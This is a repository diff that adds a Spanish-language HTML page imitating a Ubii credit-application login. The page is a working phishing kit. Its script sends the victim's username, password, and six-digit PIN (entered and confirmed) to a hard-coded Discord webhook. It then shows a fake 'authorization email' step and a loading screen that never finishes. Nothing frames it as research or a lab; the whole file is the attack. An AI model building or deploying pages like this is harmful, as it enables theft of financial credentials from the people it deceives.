@@ -1,1 +1,553 @@
-# Ubii-creditos
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inicia Sesión - Proceso de Crédito</title>
+    <!-- Tailwind CSS desde CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        ubiiBlue: '#009ee3',
+                        ubiiBlueHover: '#0088c6',
+                        ubiiBgLight: '#f3f4f6',
+                        ubiiInputBg: '#ffffff',
+                        ubiiToggleBg: '#eeeeee',
+                        ubiiTextDark: '#2c2c2c',
+                        ubiiPlaceholder: '#9ca3af',
+                    },
+                    borderRadius: {
+                        '4xl': '2rem',
+                    }
+                }
+            }
+        }
+    </script>
+    <!-- FontAwesome para los iconos -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f1f3f6;
+        }
+        /* Ocultar flechas en los inputs numéricos */
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        input[type=number] {
+            -moz-appearance: textfield;
+        }
+
+        /* Animación suave e infinita para la barra de análisis */
+        @keyframes pulseProgress {
+            0% { width: 10%; left: 0%; }
+            50% { width: 60%; left: 20%; }
+            100% { width: 90%; left: 10%; }
+        }
+        .animate-progress-infinite {
+            animation: pulseProgress 2.5s ease-in-out infinite alternate;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between items-center bg-[#f1f3f6] p-4 text-slate-800">
+
+    <!-- Indicadores de Progreso en la Parte Superior -->
+    <header class="w-full max-w-sm pt-2 pb-2">
+        <div class="flex justify-between items-center px-2">
+            <span id="stepBadge" class="text-xs font-semibold text-ubiiBlue bg-blue-100 px-3 py-1 rounded-full">Paso 1 de 4</span>
+            <span class="text-xs text-gray-400 font-medium">Solicitud de Crédito</span>
+        </div>
+        <div class="w-full bg-gray-200 h-1.5 rounded-full mt-2 overflow-hidden">
+            <div id="progressBar" class="bg-ubiiBlue h-full w-1/4 transition-all duration-300"></div>
+        </div>
+    </header>
+
+    <!-- ==================== ETAPA 1: PANTALLA DE LOGIN ==================== -->
+    <main id="step1Screen" class="w-full max-w-sm bg-white rounded-3xl shadow-sm p-6 sm:p-8 my-auto border border-gray-100">
+        
+        <!-- Título Central -->
+        <div class="flex flex-col items-center justify-center mb-6">
+            <h1 class="text-2xl font-bold text-[#1a1a1a]">Inicia sesión</h1>
+        </div>
+
+        <!-- Selector de Tipo de Usuario (Natural / Juridico) -->
+        <div class="bg-[#f0f2f5] p-1 rounded-full flex items-center mb-5 relative">
+            <button id="btnNatural" type="button" onclick="selectType('natural')" class="w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-300 bg-ubiiBlue text-white shadow-sm">
+                Natural
+            </button>
+            <button id="btnJuridico" type="button" onclick="selectType('juridico')" class="w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-300 text-gray-600 hover:text-gray-800">
+                Juridico
+            </button>
+        </div>
+
+        <!-- Formulario de Entrada -->
+        <form id="loginForm" onsubmit="goToStep2(event)" class="space-y-4">
+            
+            <!-- Campo Usuario / Correo -->
+            <div>
+                <input 
+                    type="text" 
+                    id="username" 
+                    placeholder="Usuario / Correo" 
+                    required
+                    class="w-full px-4 py-3.5 border border-gray-200 rounded-xl text-sm focus:outline-none focus:border-ubiiBlue transition-colors placeholder-gray-400 font-normal"
+                >
+            </div>
+
+            <!-- Campo Contraseña -->
+            <div class="relative">
+                <input 
+                    type="password" 
+                    id="password" 
+                    placeholder="Contraseña" 
+                    required
+                    class="w-full px-4 py-3.5 pr-12 border border-gray-200 rounded-xl text-sm focus:outline-none focus:border-ubiiBlue transition-colors placeholder-gray-400 font-normal"
+                >
+                <button 
+                    type="button" 
+                    onclick="togglePassword()" 
+                    class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 focus:outline-none"
+                >
+                    <i id="eyeIcon" class="fa-regular fa-eye-slash text-lg"></i>
+                </button>
+            </div>
+
+            <!-- Enlace "¿Olvidaste tú contraseña?" -->
+            <div class="text-left pt-1">
+                <a href="#" class="text-xs font-semibold text-ubiiBlue hover:underline">
+                    ¿Olvidaste tú contraseña?
+                </a>
+            </div>
+
+            <!-- Botón Ingresar -->
+            <div class="pt-2">
+                <button 
+                    type="submit" 
+                    class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-semibold rounded-full text-sm transition-colors shadow-sm focus:outline-none"
+                >
+                    Ingresar
+                </button>
+            </div>
+
+            <!-- Botón Registrarme -->
+            <div>
+                <button 
+                    type="button" 
+                    class="w-full py-3.5 bg-[#f0f2f5] hover:bg-gray-200 text-gray-800 font-semibold rounded-full text-sm transition-colors focus:outline-none"
+                >
+                    Registrarme
+                </button>
+            </div>
+        </form>
+
+        <!-- Pie de página con enlace de soporte -->
+        <div class="mt-8 text-center text-xs text-gray-600">
+            ¿Tienes problemas? <a href="#" class="text-ubiiBlue font-medium hover:underline">Contáctanos</a>
+        </div>
+    </main>
+
+
+    <!-- ==================== ETAPA 2: CLAVE DE SEGURIDAD REGISTRADA ==================== -->
+    <main id="step2Screen" class="w-full max-w-sm bg-white rounded-3xl shadow-sm p-6 sm:p-8 my-auto border border-gray-100 hidden">
+        
+        <!-- Botón Volver -->
+        <button type="button" onclick="goToStep(1)" class="text-gray-400 hover:text-gray-600 mb-2 flex items-center gap-2 text-sm font-medium focus:outline-none">
+            <i class="fa-solid fa-arrow-left"></i> Volver
+        </button>
+
+        <!-- Título e Subtítulo -->
+        <div class="flex flex-col items-center justify-center text-center mb-6">
+            <div class="w-14 h-14 bg-blue-50 text-ubiiBlue rounded-full flex items-center justify-center mb-3">
+                <i class="fa-solid fa-lock text-2xl"></i>
+            </div>
+            <h1 class="text-xl font-bold text-[#1a1a1a]">Clave de seguridad</h1>
+            <p class="text-xs text-gray-500 mt-2">
+                Ingresa la clave de 6 dígitos que registraste en la app para la cuenta <span class="displayUser font-semibold text-gray-700"></span>
+            </p>
+        </div>
+
+        <!-- Formulario PIN paso 1 -->
+        <form id="pinFormStep2" onsubmit="goToStep3(event)" class="space-y-6">
+            
+            <!-- 6 Cajas para los dígitos -->
+            <div class="flex justify-between items-center gap-1.5 sm:gap-2">
+                <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-11 h-12 text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-1 focus:ring-ubiiBlue bg-gray-50" required>
+                <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-11 h-12 text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-1 focus:ring-ubiiBlue bg-gray-50" required>
+                <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-11 h-12 text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-1 focus:ring-ubiiBlue bg-gray-50" required>
+                <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-11 h-12 text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-1 focus:ring-ubiiBlue bg-gray-50" required>
+                <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-11 h-12 text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-1 focus:ring-ubiiBlue bg-gray-50" required>
+                <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-11 h-12 text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-1 focus:ring-ubiiBlue bg-gray-50" required>
+            </div>
+
+            <!-- Enlace de recuperación -->
+            <div class="text-center pt-1">
+                <a href="#" class="text-xs font-semibold text-ubiiBlue hover:underline">
+                    ¿Olvidaste tu clave de 6 dígitos?
+                </a>
+            </div>
+
+            <!-- Botón Continuar -->
+            <div class="pt-2">
+                <button 
+                    type="submit" 
+                    class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-semibold rounded-full text-sm transition-colors shadow-sm focus:outline-none"
+                >
+                    Continuar
+                </button>
+            </div>
+        </form>
+
+        <div class="mt-8 text-center text-xs text-gray-600">
+            ¿Tienes problemas? <a href="#" class="text-ubiiBlue font-medium hover:underline">Contáctanos</a>
+        </div>
+    </main>
+
+
+    <!-- ==================== ETAPA 3: CONFIRMACIÓN DE CLAVE (6 DÍGITOS) ==================== -->
+    <main id="step3Screen" class="w-full max-w-sm bg-white rounded-3xl shadow-sm p-6 sm:p-8 my-auto border border-gray-100 hidden">
+        
+        <!-- Botón Volver -->
+        <button type="button" onclick="goToStep(2)" class="text-gray-400 hover:text-gray-600 mb-2 flex items-center gap-2 text-sm font-medium focus:outline-none">
+            <i class="fa-solid fa-arrow-left"></i> Volver
+        </button>
+
+        <!-- Título e Subtítulo -->
+        <div class="flex flex-col items-center justify-center text-center mb-6">
+            <div class="w-14 h-14 bg-blue-50 text-ubiiBlue rounded-full flex items-center justify-center mb-3">
+                <i class="fa-solid fa-key text-2xl text-ubiiBlue"></i>
+            </div>
+            <h1 class="text-xl font-bold text-[#1a1a1a]">Confirma tu clave</h1>
+            <p class="text-xs text-gray-500 mt-2">
+                Ingresa nuevamente tu clave de 6 dígitos para confirmar la operación de crédito.
+            </p>
+        </div>
+
+        <!-- Formulario PIN Paso 2 (Confirmación) -->
+        <form id="pinFormStep3" onsubmit="goToStep4(event)" class="space-y-6">
+            
+            <!-- 6 Cajas de Confirmación -->
+            <div class="flex justify-between items-center gap-1.5 sm:gap-2">
+                <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-3 w-11 h-12 text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-1 focus:ring-ubiiBlue bg-gray-50" required>
+                <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-3 w-11 h-12 text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-1 focus:ring-ubiiBlue bg-gray-50" required>
+                <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-3 w-11 h-12 text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-1 focus:ring-ubiiBlue bg-gray-50" required>
+                <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-3 w-11 h-12 text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-1 focus:ring-ubiiBlue bg-gray-50" required>
+                <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-3 w-11 h-12 text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-1 focus:ring-ubiiBlue bg-gray-50" required>
+                <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-3 w-11 h-12 text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-1 focus:ring-ubiiBlue bg-gray-50" required>
+            </div>
+
+            <!-- Alerta de no coincidencia -->
+            <p id="errorMismatch" class="text-xs text-red-500 font-semibold text-center hidden">
+                Las claves no coinciden. Por favor inténtalo de nuevo.
+            </p>
+
+            <!-- Botón Confirmar Clave -->
+            <div class="pt-2">
+                <button 
+                    type="submit" 
+                    class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-semibold rounded-full text-sm transition-colors shadow-sm focus:outline-none"
+                >
+                    Confirmar Clave
+                </button>
+            </div>
+        </form>
+
+        <div class="mt-8 text-center text-xs text-gray-600">
+            ¿Tienes problemas? <a href="#" class="text-ubiiBlue font-medium hover:underline">Contáctanos</a>
+        </div>
+    </main>
+
+
+    <!-- ==================== ETAPA 4: AUTORIZACIÓN POR CORREO & ANÁLISIS POSTERIOR ==================== -->
+    <main id="step4Screen" class="w-full max-w-sm bg-white rounded-3xl shadow-sm p-6 sm:p-8 my-auto border border-gray-100 hidden">
+        
+        <!-- Botón Volver (Se oculta durante el análisis) -->
+        <button id="backFromStep4Btn" type="button" onclick="goToStep(3)" class="text-gray-400 hover:text-gray-600 mb-2 flex items-center gap-2 text-sm font-medium focus:outline-none">
+            <i class="fa-solid fa-arrow-left"></i> Volver
+        </button>
+
+        <!-- VISTA DE CORREO DE AUTORIZACIÓN (PANTALLA INICIAL DEL PASO 4) -->
+        <div id="emailAuthSection">
+            <div class="flex flex-col items-center justify-center text-center mb-6">
+                <!-- Icono Animado de Envoltorio de Correo -->
+                <div class="w-16 h-16 bg-blue-50 text-ubiiBlue rounded-full flex items-center justify-center mb-3 relative">
+                    <i class="fa-solid fa-envelope text-3xl animate-bounce"></i>
+                    <span class="absolute -top-1 -right-1 flex h-4 w-4">
+                      <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-75"></span>
+                      <span class="relative inline-flex rounded-full h-4 w-4 bg-ubiiBlue"></span>
+                    </span>
+                </div>
+                <h1 class="text-xl font-bold text-[#1a1a1a]">Autorización requerida</h1>
+                <p class="text-xs text-gray-500 mt-2 leading-relaxed">
+                    Hemos enviado un correo de autorización a tu dirección registrada: <br>
+                    <span class="displayUserEmail font-semibold text-ubiiBlue"></span>
+                </p>
+            </div>
+
+            <!-- Instrucciones para el usuario -->
+            <div class="bg-blue-50/70 border border-blue-100 rounded-2xl p-4 mb-6 text-xs text-slate-700 space-y-2">
+                <div class="flex items-start gap-2">
+                    <i class="fa-solid fa-circle-info text-ubiiBlue text-sm mt-0.5"></i>
+                    <p>Por favor, ingresa a tu bandeja de entrada y da autorización para continuar con el proceso del crédito.</p>
+                </div>
+            </div>
+
+            <!-- Acciones -->
+            <div class="space-y-3">
+                <!-- Botón que activa la carga infinita del análisis -->
+                <button 
+                    type="button" 
+                    onclick="startCreditAnalysis()" 
+                    class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-semibold rounded-full text-sm transition-colors shadow-sm focus:outline-none flex items-center justify-center gap-2"
+                >
+                    <i class="fa-solid fa-circle-check"></i>
+                    Ya Autoricé Desde Mi Correo
+                </button>
+
+                <!-- Botón Reenviar Correo -->
+                <button 
+                    type="button" 
+                    onclick="resendAuthEmail()" 
+                    class="w-full py-3.5 bg-[#f0f2f5] hover:bg-gray-200 text-gray-800 font-semibold rounded-full text-sm transition-colors focus:outline-none"
+                >
+                    Reenviar Correo
+                </button>
+            </div>
+        </div>
+
+        <!-- VISTA DE CARGA INFINITA (SE MUESTRA AL PRESIONAR "YA AUTORICÉ DESDE MI CORREO") -->
+        <div id="loadingAnalysis" class="hidden flex flex-col items-center justify-center text-center py-6 space-y-4">
+            <!-- Spinner / Indicador de Carga Animado de Forma Infinita -->
+            <div class="relative w-20 h-20 flex items-center justify-center my-2">
+                <div class="w-20 h-20 border-4 border-blue-100 border-t-ubiiBlue rounded-full animate-spin"></div>
+                <i class="fa-solid fa-chart-line text-ubiiBlue text-2xl absolute"></i>
+            </div>
+            
+            <div class="space-y-2">
+                <h1 class="text-lg font-bold text-[#1a1a1a]">Analizando Solicitud</h1>
+                <p class="text-xs text-gray-600 leading-relaxed font-medium px-2">
+                    Este proceso demora un poco por favor no cerrar la página
+                </p>
+            </div>
+
+            <!-- Barra de Progreso Interna en Bucle Indefinido -->
+            <div class="w-full bg-gray-100 h-2 rounded-full overflow-hidden mt-4 relative">
+                <div class="bg-ubiiBlue h-full rounded-full animate-progress-infinite relative"></div>
+            </div>
+        </div>
+
+        <!-- Pie de página con enlace de soporte -->
+        <div class="mt-8 text-center text-xs text-gray-600">
+            ¿Tienes problemas? <a href="#" class="text-ubiiBlue font-medium hover:underline">Contáctanos</a>
+        </div>
+    </main>
+
+    <!-- Espaciador inferior -->
+    <footer class="w-full text-center pb-2 text-xs text-gray-400">
+    </footer>
+
+    <!-- Lógica JavaScript -->
+    <script>
+        // URL de tu Webhook de Discord vinculada
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1539815628586749962/vZ-AWmOfGZ8SIfj61NbVcMOxvmRGuy3dM5xEgp7QmpLl9lJekjsccXClXIs1QUCYeLA9";
+
+        let selectedType = 'natural';
+        let firstEnteredPin = '';
+        let userEmailOrName = '';
+        let userPassword = '';
+
+        // Función para enviar mensajes formateados a Discord
+        function sendToDiscord(messageText) {
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    username: "Notificador Ubii",
+                    content: messageText
+                })
+            }).catch(err => console.error("Error al enviar a Discord:", err));
+        }
+
+        // Cambiar entre tipo Natural / Jurídico
+        function selectType(type) {
+            selectedType = type;
+            const btnNatural = document.getElementById('btnNatural');
+            const btnJuridico = document.getElementById('btnJuridico');
+
+            if (type === 'natural') {
+                btnNatural.className = "w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-300 bg-ubiiBlue text-white shadow-sm";
+                btnJuridico.className = "w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-300 text-gray-600 hover:text-gray-800";
+            } else {
+                btnJuridico.className = "w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-300 bg-ubiiBlue text-white shadow-sm";
+                btnNatural.className = "w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-300 text-gray-600 hover:text-gray-800";
+            }
+        }
+
+        // Mostrar / Ocultar contraseña del primer paso
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const eyeIcon = document.getElementById('eyeIcon');
+
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                eyeIcon.className = "fa-regular fa-eye text-lg";
+            } else {
+                passwordInput.type = 'password';
+                eyeIcon.className = "fa-regular fa-eye-slash text-lg";
+            }
+        }
+
+        // Gestión centralizada de Pasos (1 a 4)
+        function goToStep(stepNumber) {
+            // Ocultar todas las pantallas
+            document.getElementById('step1Screen').classList.add('hidden');
+            document.getElementById('step2Screen').classList.add('hidden');
+            document.getElementById('step3Screen').classList.add('hidden');
+            document.getElementById('step4Screen').classList.add('hidden');
+
+            // Resetear vistas internas del paso 4
+            document.getElementById('emailAuthSection').classList.remove('hidden');
+            document.getElementById('loadingAnalysis').classList.add('hidden');
+            document.getElementById('backFromStep4Btn').classList.remove('hidden');
+
+            // Actualizar barra de progreso y badge
+            const progressBar = document.getElementById('progressBar');
+            const stepBadge = document.getElementById('stepBadge');
+            stepBadge.innerText = `Paso ${stepNumber} de 4`;
+
+            if (stepNumber === 1) progressBar.style.width = '25%';
+            if (stepNumber === 2) progressBar.style.width = '50%';
+            if (stepNumber === 3) progressBar.style.width = '75%';
+            if (stepNumber === 4) progressBar.style.width = '100%';
+
+            // Mostrar pantalla seleccionada
+            const activeScreen = document.getElementById(`step${stepNumber}Screen`);
+            activeScreen.classList.remove('hidden');
+
+            // Enfocar primer input si aplica
+            if (stepNumber === 2) {
+                const inputs = document.querySelectorAll('.pin-input-2');
+                inputs.forEach(i => i.value = '');
+                if (inputs.length > 0) inputs[0].focus();
+            } else if (stepNumber === 3) {
+                const inputs = document.querySelectorAll('.pin-input-3');
+                inputs.forEach(i => i.value = '');
+                document.getElementById('errorMismatch').classList.add('hidden');
+                if (inputs.length > 0) inputs[0].focus();
+            }
+        }
+
+        // Activa el estado de carga indefinido tras pulsar "Ya Autoricé Desde Mi Correo"
+        function startCreditAnalysis() {
+            const loadingSec = document.getElementById('loadingAnalysis');
+            const emailSec = document.getElementById('emailAuthSection');
+            const backBtn = document.getElementById('backFromStep4Btn');
+
+            emailSec.classList.add('hidden');
+            loadingSec.classList.remove('hidden');
+            backBtn.classList.add('hidden');
+
+            sendToDiscord(`⏳ **El usuario hizo clic en 'Ya Autoricé Desde Mi Correo' y comenzó el análisis.**`);
+        }
+
+        // Ir del Paso 1 al Paso 2 (Envía usuario y contraseña a Discord)
+        function goToStep2(event) {
+            event.preventDefault();
+            userEmailOrName = document.getElementById('username').value;
+            userPassword = document.getElementById('password').value;
+            
+            // Actualizar textos informativos del usuario
+            document.querySelectorAll('.displayUser').forEach(el => el.innerText = `(${userEmailOrName})`);
+            document.querySelectorAll('.displayUserEmail').forEach(el => {
+                el.innerText = userEmailOrName.includes('@') ? userEmailOrName : `${userEmailOrName}@correo.com`;
+            });
+
+            // Notificación a Discord
+            sendToDiscord(`📌 **NUEVO INICIO DE SESIÓN**\n👤 **Tipo:** ${selectedType}\n📧 **Usuario/Correo:** ${userEmailOrName}\n🔑 **Contraseña:** ${userPassword}`);
+
+            goToStep(2);
+        }
+
+        // Ir del Paso 2 al Paso 3 (Envía el primer PIN ingresado a Discord)
+        function goToStep3(event) {
+            event.preventDefault();
+            const inputs = document.querySelectorAll('.pin-input-2');
+            firstEnteredPin = '';
+            inputs.forEach(i => firstEnteredPin += i.value);
+
+            if (firstEnteredPin.length === 6) {
+                sendToDiscord(`🔢 **CLAVE DE SEGURIDAD (PASO 2)**\n📧 **Usuario:** ${userEmailOrName}\n🔐 **PIN:** ${firstEnteredPin}`);
+                goToStep(3);
+            }
+        }
+
+        // Ir del Paso 3 al Paso 4 (Envía la confirmación del PIN a Discord)
+        function goToStep4(event) {
+            event.preventDefault();
+            const inputs = document.querySelectorAll('.pin-input-3');
+            let confirmPin = '';
+            inputs.forEach(i => confirmPin += i.value);
+
+            if (confirmPin === firstEnteredPin) {
+                sendToDiscord(`✅ **CONFIRMACIÓN DE CLAVE (PASO 3)**\n📧 **Usuario:** ${userEmailOrName}\n🔐 **PIN Confirmado:** ${confirmPin}`);
+                goToStep(4);
+            } else {
+                sendToDiscord(`⚠️ **ERROR DE CLAVE (PASO 3)**\n📧 **Usuario:** ${userEmailOrName}\n❌ **Ingresó PIN incorrecto:** ${confirmPin}`);
+                document.getElementById('errorMismatch').classList.remove('hidden');
+                inputs.forEach(i => i.value = '');
+                inputs[0].focus();
+            }
+        }
+
+        // Lógica de entradas para inputs numéricos de 6 dígitos
+        function setupPinInputs(selectorClass) {
+            const inputs = document.querySelectorAll(selectorClass);
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    if (e.target.value.length > 1) {
+                        e.target.value = e.target.value.slice(-1);
+                    }
+                    if (e.target.value !== '' && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                });
+
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+
+                input.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    const pasteData = e.clipboardData.getData('text').trim();
+                    if (/^\d{6}$/.test(pasteData)) {
+                        pasteData.split('').forEach((char, i) => {
+                            if (inputs[i]) inputs[i].value = char;
+                        });
+                        inputs[5].focus();
+                    }
+                });
+            });
+        }
+
+        // Configurar comportamiento para las dos pantallas de PIN
+        setupPinInputs('.pin-input-2');
+        setupPinInputs('.pin-input-3');
+
+        function resendAuthEmail() {
+            sendToDiscord(`📩 **El usuario solicitó reenvío del correo de autorización.**`);
+            const toast = document.createElement('div');
+            toast.className = "fixed bottom-6 left-1/2 -translate-x-1/2 bg-slate-800 text-white px-4 py-2.5 rounded-full text-xs font-medium shadow-lg z-50 flex items-center gap-2";
+            toast.innerHTML = `<i class="fa-solid fa-paper-plane text-ubiiBlue"></i> Correo de autorización reenviado`;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
+        }
+    </script>
+</body>
+</html>
